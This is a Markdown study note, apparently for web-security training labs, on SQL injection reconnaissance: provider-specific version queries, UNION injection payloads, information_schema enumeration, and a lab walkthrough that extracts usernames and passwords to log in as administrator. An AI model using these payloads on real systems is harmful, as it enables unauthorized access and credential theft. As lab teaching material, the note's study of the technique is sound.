# Examining the database

Before you can steal data with SQL injection, you often need to **learn the database itself** — what software and version it runs, and what tables and columns it holds.

---

**Table of contents**

- [In plain English](#in-plain-english)
- [What you want to find out](#what-you-want-to-find-out)
- [Querying the database type and version](#querying-the-database-type-and-version)
- [Listing the tables](#listing-the-tables)
- [Listing the columns in a table](#listing-the-columns-in-a-table)
- [Lab: querying the database type and version](#lab-querying-the-database-type-and-version)
- [Lab: listing the database contents (non-Oracle)](#lab-listing-the-database-contents-non-oracle)

---

## In plain English

| Topic | The idea | Takeaway |
| --- | --- | --- |
| **Version** | Ask the database what it is and which build it runs | Each database answers a **different** version query — try the provider-specific ones and the one that returns a string tells you which engine you're facing. |
| **Tables & columns** | Query the built-in catalog (`information_schema`) that lists everything | Databases keep a **map of themselves**. Read that map to find the `Users` table, then read it again to find its `Username`/`Password` columns — no guessing. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> these are a lookup sheet, not something to memorise. Remember the one-line hook above; come back here for the exact queries when you need them.
</div>

---

## What you want to find out

To exploit a SQL injection effectively, it helps to know:

- **The database type and version** — decides which syntax, functions, and tricks are available.
- **The tables and columns** — tells you *where* the data you want (usernames, passwords) actually lives.

---

## Querying the database type and version

You can often identify **both** the engine and its version by injecting a **provider-specific** version query and seeing which one works.

| Database type | Version query |
| --- | --- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

Delivered through a UNION attack:

```sql
' UNION SELECT @@version--
```

A successful response reveals the engine and build, e.g.:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

Here the string confirms **Microsoft SQL Server** and the exact version.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Why try more than one:</strong> the "wrong" version query for the actual engine throws an error instead of returning a row. Whichever one comes back with a version string is your answer — the error itself is a clue too.
</div>

---

## Listing the tables

Most databases **except Oracle** expose a set of views called the **information schema** describing the database's own structure. List every table with:

```sql
SELECT * FROM information_schema.tables
```

Example output:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Three tables: `Products`, `Users`, `Feedback`. The `Users` table is the obvious target.

---

## Listing the columns in a table

Once you know a table name, list its columns from `information_schema.columns`, filtered to that table:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Example output:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Now you know the exact column names (`Username`, `Password`) and types — everything you need to write the final data-extraction query.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Oracle is the exception:</strong> Oracle has no <code>information_schema</code>. Use <code>SELECT * FROM all_tables</code> to list tables and <code>SELECT * FROM all_tab_columns WHERE table_name = 'USERS'</code> to list columns instead.
</div>

---

## Lab: querying the database type and version

> **PRACTITIONER** — SQL injection attack, querying the database type and version (MySQL and Microsoft variants).

**Goal:** the product category filter is injectable and results are reflected. Display the **database version string**.

**Approach:**

1. Establish the column count with a UNION and find a text-compatible column.
2. Inject the matching version query for the target engine:
   - **MySQL / Microsoft:** `' UNION SELECT @@version,NULL--` *(MySQL comment may need `-- ` with a trailing space, or `#`)*
   - **Oracle:** `' UNION SELECT banner,NULL FROM v$version--`
   - **PostgreSQL:** `' UNION SELECT version(),NULL--`
3. The version string appears in the response — lab solved.

---

## Lab: listing the database contents (non-Oracle)

> **PRACTITIONER** — SQL injection attack, listing the database contents on non-Oracle databases.

**Goal:** injectable category filter with reflected results. There's a login function and a table holding usernames/passwords, but you don't know its name. Find the table and its columns, extract the rows, and log in as `administrator`.

**Approach:**

1. **Find the table:**

   ```sql
   ' UNION SELECT table_name,NULL FROM information_schema.tables--
   ```

   Look for a table like `users_abcde` (the real name is often randomised in the lab).
2. **Find its columns:**

   ```sql
   ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcde'--
   ```

   Note the two columns, e.g. `username_xxxx` and `password_yyyy`.
3. **Extract the data** (concatenate into one column if needed — see [Retrieving multiple values in a single column](Retrieving-multiple-values-in-a-single-column.md)):

   ```sql
   ' UNION SELECT username_xxxx,password_yyyy FROM users_abcde--
   ```
4. Read the `administrator` credentials and log in.
